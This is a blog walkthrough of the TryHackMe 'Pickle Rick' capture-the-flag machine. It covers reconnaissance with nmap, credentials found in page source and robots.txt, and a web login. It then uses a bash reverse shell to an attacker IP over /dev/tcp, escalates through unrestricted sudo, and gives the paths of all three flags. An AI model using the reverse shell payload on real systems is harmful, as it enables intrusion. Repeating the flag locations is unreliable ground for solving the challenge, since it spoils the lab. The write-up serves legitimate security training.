+++
date = "2025-11-17"
title = "TryHackMe - Machine - Pickle Rick v2"
author = "Javier Olmedo"
toc = false
+++

[![/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_banner.png](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_banner.png)](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_banner.png)

Hey hackers! 👋

Today we’re diving into the [Pickle Rick machine](https://tryhackme.com/room/picklerick) on TryHackMe. It’s a classic **🟩 Easy** challenge, perfect for practicing web enumeration and basic privilege escalation.

## 🚀 Before Starting

**Add** the machine to the `/etc/hosts` file, **check connectivity** with `ping`, and **create the working folders**

```bash
echo '10.10.34.26\tpicklerick.thm' | sudo tee -a /etc/hosts
ping -c 1 picklerick.thm
mkdir -p ~/thm/picklerick/{exploits,fuzz,http,nmap}
cd ~/thm/picklerick/
```

## 🔎 Reconnaissance

### Scan with nmap

Check **all ports** that are **open**, detect the service and its version with `nmap` and generate `all.html` to see information.

```bash
nmap -sTCV -p- -Pn -A -T4 --min-rate=1000 -vvv -oA ~/thm/picklerick/nmap/all picklerick.thm
```

```bash
xsltproc ~/thm/picklerick/nmap/all.xml > ~/thm/picklerick/nmap/all.html
```

[![/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_nmap.png](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_nmap.png)](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_nmap.png)

### 🌐 Check website

Open firefox to inspect website

```bash
firefox http://picklerick.thm &
```

🕵️‍♂️ You can find a username in the source code.

[![/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_website.png](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_website.png)](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_website.png)

A text string is also found when checking the robots.txt file, which could be the user's password.

```bash
curl [http://picklerick.thm/robots.txt](http://picklerick.thm/robots.txt)
xxxxxxxxxxxxxxxxx
```

## 🚪 Initial Access (Foothold)

It's clear there must be some kind of login panel or similar. We try the typical `login.php`, `access.php`, etc.

I found `login.php`, we try with the 🔑 credentials we detected during reconnaissance and Boom... **we're in!**

[![/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_login.png](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_login.png)](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_login.png)

[![/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_access.png](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_access.png)](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_access.png)

### Getting a reverse shell

I was trying several payloads, finally I used the [Revshells](https://www.revshells.com/) resource to generate a bash payload.

```bash
bash -c 'bash -i >& /dev/tcp/10.8.95.209/1337 0>&1'
```

[![/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_001.png](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_001.png)](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_001.png)

[![/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_002.png](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_002.png)](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_002.png)

[![/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_003.png](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_003.png)](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_003.png)

## 🧗‍♂️ Privilege Escalation

When viewing the output of `sudo -l` we can see that any command can be run as sudo.

```bash
www-data@ip-10-10-34-26:/var/www/html$ sudo -l
Matching Defaults entries for www-data on ip-10-10-34-26:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-34-26:
    (ALL) NOPASSWD: ALL
```

Now that we are `root` we can display the contents of the **three flags** at:

- 🥒 1st flag > `cat /var/www/html/Sup3rS3cretPickl3Ingred.txt`
- 🥒 2nd flag > `cat /home/rick/'second ingredients'`
- 🥒 3rd flag > `sudo cat /root/3rd.txt`

[![/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_complete.png](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_complete.png)](/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_complete.png)
